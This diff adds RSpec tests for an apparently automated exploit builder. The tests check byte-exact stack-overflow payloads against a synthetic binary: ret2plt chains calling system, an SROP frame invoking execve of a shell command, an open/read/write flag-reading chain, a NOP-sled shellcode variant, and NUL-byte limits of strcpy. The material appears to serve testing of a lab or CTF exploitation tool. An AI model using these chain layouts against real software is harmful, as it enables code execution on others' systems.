@@ -194,6 +194,26 @@ RSpec.describe "the pack build: section" do
     # the dword slot is 4 bytes wide even on x64 (the width per slot)
     expect(File.binread(out)).to eq(("A" * 16).b + [4_196_182].pack("L<"))
   end
+
+  it "truncates the word slot to the low 16 bits (the PIE page hop)" do
+    out = File.join(dir, "w.bin")
+    facts = "nx(\"true\").\npie(\"true\").\nwin_symbol(\"win\", 4196182).\n"
+    pack = Augure::Pack.load_hash(
+      "technique" => "fancy_hop", "author" => "spec", "source" => "https://example.com",
+      "rules" => [{"id" => "app_fancy", "head" => %w[applicable fancy_hop],
+                   "conditions" => [%w[fact target_function true]]}],
+      "kb" => [{"id" => "f1", "description" => "f", "success_rate" => 0.5}],
+      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
+      "priors" => [1, 1],
+      "build" => {"technique" => "fancy_hop",
+                  "layout" => [["padding"], %w[word win]]}
+    )
+    Lictor::PayloadBuilder.build(binary: binary, facts: facts,
+      technique: "fancy_hop", out: out, packs: [pack])
+    # the word slot is 2 bytes wide: the low 16 bits only (the saved
+    # RIP's high bytes stay original - the page hop)
+    expect(File.binread(out)).to eq(("A" * 16).b + [4_196_182].pack("S<"))
+  end
 end
 
 RSpec.describe Lictor::PayloadBuilder, "the chain slot" do
@@ -236,6 +256,94 @@ RSpec.describe Lictor::PayloadBuilder, "the chain slot" do
     expect do
       described_class.build(binary: binary, facts: facts, technique: "ret2plt", out: out)
     end.to raise_error(Lictor::PayloadBuilder::BuildError, /pop_rdi_ret/)
+  end
+end
+
+RSpec.describe Lictor::PayloadBuilder, "the NUL-terminated channel" do
+  let(:dir) { Dir.mktmpdir }
+  let(:binary) { ProfilerBinaryBuilder.vulnerable }
+  let(:out) { File.join(dir, "p.bin") }
+
+  # the strcpy channel stops at the first NUL: a chain qword carrying a
+  # NUL byte truncates the copy BEFORE the rest of the chain lands -
+  # the middle qwords must ride NUL-free, the last may be partial (the
+  # stack keeps the high bytes). The bounded channels (read/fgets/...)
+  # copy the exact count: NULs ride whole.
+  it "refuses a chain whose middle qword carries a NUL on a strcpy channel" do
+    # the first qword rides NUL-free (the copy continues into the rest
+    # of the chain), so the error names the middle qword
+    facts = "sink(\"strcpy\").\nnx(\"true\").\npie(\"false\").\n" \
+            "gadget(\"pop_rdi_ret\", 4702111234474983745).\n" \
+            "plt_addr(\"puts\", 4196104).\ngot_addr(\"puts\", 4196112).\n"
+    expect do
+      described_class.build(binary: binary, facts: facts, technique: "ret2plt", out: out)
+    end.to raise_error(Lictor::PayloadBuilder::BuildError,
+      /got_addr:puts.*NUL.*strcpy.*stops the copy/m)
+  end
+
+  it "builds the same chain on a bounded channel: NULs ride the copy" do
+    facts = "sink(\"read\").\nnx(\"true\").\npie(\"false\").\n" \
+            "gadget(\"pop_rdi_ret\", 4196100).\n" \
+            "plt_addr(\"puts\", 4196104).\ngot_addr(\"puts\", 4196112).\n"
+    result = described_class.build(binary: binary, facts: facts, technique: "ret2plt", out: out)
+    expect(File.binread(out)).to eq(("A" * 16).b + [4_196_100, 4_196_112, 4_196_104].pack("Q<*"))
+    expect(result[:ret_source]).to include("gadget:pop_rdi_ret")
+  end
+
+  it "lets the last chain qword ride partial: the stack keeps the high bytes" do
+    # the last qword is the final return address: its trailing NULs are
+    # the stack's own bytes - the copy may stop there, nothing follows.
+    # the first qword must ride NUL-free: the copy continues into the
+    # next qword, so the synthetic address is 0x41-filled (no NUL)
+    facts = "sink(\"strcpy\").\nnx(\"true\").\npie(\"false\").\n" \
+            "gadget(\"pop_rdi_ret\", 4702111234474983745).\n" \
+            "plt_addr(\"puts\", 4196104).\n"
+    pack = Augure::Pack.load_hash(
+      "technique" => "last_qword_probe", "author" => "spec", "source" => "https://example.com",
+      "rules" => [{"id" => "app_lqp", "head" => %w[applicable last_qword_probe],
+                   "conditions" => [%w[fact nx true]]}],
+      "kb" => [{"id" => "l1", "description" => "l", "success_rate" => 0.5}],
+      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
+      "priors" => [1, 1],
+      "build" => {"technique" => "last_qword_probe",
+                  "layout" => [["padding"], ["chain", "gadget:pop_rdi_ret", "plt_addr:puts"]]}
+    )
+    result = described_class.build(binary: binary, facts: facts, technique: "last_qword_probe",
+      out: out, packs: [pack])
+    expect(File.binread(out)).to eq(("A" * 16).b + [4_702_111_234_474_983_745, 4_196_104].pack("Q<*"))
+    expect(result[:ret_source]).to include("gadget:pop_rdi_ret")
+  end
+
+  it "refuses a last chain qword whose NUL is not at the top" do
+    # 0x40001234: a NUL at byte 2, followed by 0x40 - the partial
+    # overwrite would land 0x401234, not the intended value. the first
+    # qword rides NUL-free so the error names the last qword
+    facts = "sink(\"strcpy\").\nnx(\"true\").\npie(\"false\").\n" \
+            "gadget(\"pop_rdi_ret\", 4702111234474983745).\n" \
+            "plt_addr(\"puts\", 4196104).\n"
+    pack = Augure::Pack.load_hash(
+      "technique" => "mid_nul_probe", "author" => "spec", "source" => "https://example.com",
+      "rules" => [{"id" => "app_mnp", "head" => %w[applicable mid_nul_probe],
+                   "conditions" => [%w[fact nx true]]}],
+      "kb" => [{"id" => "m1", "description" => "m", "success_rate" => 0.5}],
+      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
+      "priors" => [1, 1],
+      "build" => {"technique" => "mid_nul_probe",
+                  "layout" => [["padding"], ["chain", "gadget:pop_rdi_ret", "const:1073747252"]]}
+    )
+    expect do
+      described_class.build(binary: binary, facts: facts, technique: "mid_nul_probe",
+        out: out, packs: [pack])
+    end.to raise_error(Lictor::PayloadBuilder::BuildError, /const:1073747252.*NUL/m)
+  end
+
+  it "leaves the chains unchecked when the facts carry no sink" do
+    # the old contracts: the facts do not name the channel, the builder
+    # builds (the sink fact is the profiler's emission, not the builder's guess)
+    facts = "nx(\"true\").\npie(\"false\").\ngadget(\"pop_rdi_ret\", 4196100).\n" \
+            "plt_addr(\"puts\", 4196104).\ngot_addr(\"puts\", 4196112).\n"
+    described_class.build(binary: binary, facts: facts, technique: "ret2plt", out: out)
+    expect(File.binread(out)).to eq(("A" * 16).b + [4_196_100, 4_196_112, 4_196_104].pack("Q<*"))
   end
 end
 
@@ -412,5 +520,108 @@ RSpec.describe Lictor::PayloadBuilder, "the layout variants walk" do
         technique: "twin_probe", out: out, packs: [pack])
     end.to raise_error(Lictor::PayloadBuilder::BuildError,
       /plt_csu: .*pop_rdi_ret.*static_stages: .*pop_rdi_rsi_rdx_ret/m)
+  end
+end
+
+# the real augure pack layouts (the eval2 twins, the orw variants):
+# exercised here against the synthetic binary, not only against the
+# live lab targets - the packs ARE the contract
+RSpec.describe Lictor::PayloadBuilder, "the real augure pack layouts" do
+  let(:dir) { Dir.mktmpdir }
+  let(:binary) { ProfilerBinaryBuilder.vulnerable }
+  let(:out) { File.join(dir, "payload.bin") }
+
+  def real_pack(name)
+    packs_dir = ["../../augure/packs", "../augure/packs"]
+      .map { |p| File.expand_path(p, __dir__) }
+      .find { |p| File.directory?(p) }
+    Augure::PackLoader.load_file(File.join(packs_dir, "#{name}.yml"))
+  end
+
+  it "builds the srop_eval2 frame: sigreturn gadget + the full ucontext" do
+    facts = "vuln(\"sof\").\nnx(\"true\").\npie(\"false\").\n" \
+            "gadget(\"sigreturn\", 4198846).\nsym_addr(\"sh_cmd\", 4196182).\n"
+    result = described_class.build(binary: binary, facts: facts,
+      technique: "srop_eval2", out: out, packs: [real_pack("srop_eval2")])
+    body = File.binread(out)
+    zero = [0].pack("Q<")
+    # the frame: sigreturn gadget, then the 13 uc-prefix zeros (5 unread
+    # + R8..R15), RDI=sh_cmd, RSI/RBP/RBX/RDX zero, RAX=59 (execve),
+    # RCX/RSP zero, RIP=the syscall tail (sym+7), EFL 0x202, CSGSFS
+    # 0x33, then ERR/TRAPNO/OLDMASK/CR2 and the 8 reserved words
+    expect(body).to eq(
+      ("A" * 16).b + [4_198_846].pack("Q<") +
+      zero * 13 + [4_196_182].pack("Q<") + zero * 4 +
+      [59].pack("Q<") + zero * 2 +
+      [4_198_853].pack("Q<") +
+      [514, 51].pack("Q<2") + zero * 13
+    )
+    expect(result[:ret_source]).to include("gadget:sigreturn@4198846")
+  end
+
+  it "builds the callme_eval2 vault chain: three pop3 stages" do
+    facts = "vuln(\"sof\").\ngadget(\"pop_rdi_rsi_rdx_ret\", 4198846).\n" \
+            "sym_addr(\"vault_arm\", 4196100).\nsym_addr(\"vault_fire\", 4196200).\n" \
+            "sym_addr(\"vault_open\", 4196300).\n"
+    result = described_class.build(binary: binary, facts: facts,
+      technique: "callme_eval2", out: out, packs: [real_pack("callme_eval2")])
+    pop3 = [4_198_846].pack("Q<")
+    stage = lambda do |magic_base, sym|
+      pop3 + [magic_base, magic_base + 1, magic_base + 2].pack("Q<3") + [sym].pack("Q<")
+    end
+    expect(File.binread(out)).to eq(
+      ("A" * 16).b + stage.call(2_712_845_057, 4_196_100) +
+        stage.call(2_712_845_060, 4_196_200) + stage.call(2_712_845_063, 4_196_300)
+    )
+    expect(result[:ret_source]).to include("gadget:pop_rdi_rsi_rdx_ret@4198846")
+  end
+
+  it "builds the ret2plt_eval2 chain: ret_align + pop_rdi + system@plt" do
+    facts = "vuln(\"sof\").\ngadget(\"ret_align\", 4196100).\n" \
+            "gadget(\"pop_rdi_ret\", 4196101).\nplt_addr(\"system\", 4196200).\n" \
+            "sym_addr(\"arg_cmd\", 4196182).\n"
+    result = described_class.build(binary: binary, facts: facts,
+      technique: "ret2plt_eval2", out: out, packs: [real_pack("ret2plt_eval2")])
+    expect(File.binread(out)).to eq(
+      ("A" * 16).b + [4_196_100, 4_196_101, 4_196_182, 4_196_200].pack("Q<4")
+    )
+    expect(result[:ret_source]).to include("gadget:ret_align@4196100")
+  end
+
+  it "builds the orw rop variant: openat/read/write syscall chain" do
+    facts = "vuln(\"sof\").\n" \
+            "gadget(\"pop_rax_ret\", 4196100).\ngadget(\"pop_rdi_ret\", 4196101).\n" \
+            "gadget(\"pop_rsi_ret\", 4196102).\ngadget(\"pop_rdx_ret\", 4196103).\n" \
+            "gadget(\"syscall_ret\", 4196104).\n" \
+            "sym_addr(\"flag_path\", 4196182).\nsym_addr(\"out_buf\", 4196183).\n"
+    result = described_class.build(binary: binary, facts: facts,
+      technique: "orw", out: out, packs: [real_pack("orw")])
+    expect(result[:variant]).to eq("rop")
+    # the chain: 3 syscalls (openat/read/write), each 6 gadget pairs + syscall_ret
+    at_fdcwd = [18_446_744_073_709_551_516].pack("Q<")
+    q = ->(v) { [v].pack("Q<") }
+    expect(File.binread(out)).to eq(
+      ("A" * 16).b +
+      q.call(4_196_100) + q.call(257) + q.call(4_196_101) + at_fdcwd + q.call(4_196_102) + q.call(4_196_182) +
+      q.call(4_196_103) + q.call(0) + q.call(4_196_104) +
+      q.call(4_196_100) + q.call(0) + q.call(4_196_101) + q.call(3) + q.call(4_196_102) + q.call(4_196_183) +
+      q.call(4_196_103) + q.call(256) + q.call(4_196_104) +
+      q.call(4_196_100) + q.call(1) + q.call(4_196_101) + q.call(1) + q.call(4_196_102) + q.call(4_196_183) +
+      q.call(4_196_103) + q.call(256) + q.call(4_196_104)
+    )
+    expect(result[:ret_source]).to include("gadget:pop_rax_ret@4196100")
+  end
+
+  it "builds the orw stack variant from the harvest leak when the gadgets are absent" do
+    custom = File.join(dir, "sc.bin")
+    File.binwrite(custom, "\xcc" * 10) # the stub: the encoder keeps it NUL-free
+    facts = "vuln(\"sof\").\nnx(\"false\").\nseccomp(\"true\").\n" \
+            "leaked_address(\"input\", 140730103547632).\n"
+    result = described_class.build(binary: binary, facts: facts,
+      technique: "orw", out: out, packs: [real_pack("orw")], payload_file: custom)
+    expect(result[:variant]).to eq("stack")
+    body = File.binread(out)
+    expect(body).to start_with(("\x90" * result[:offset]).b)
+    expect(body).to include([140_730_103_547_632].pack("Q<"))
   end
 end
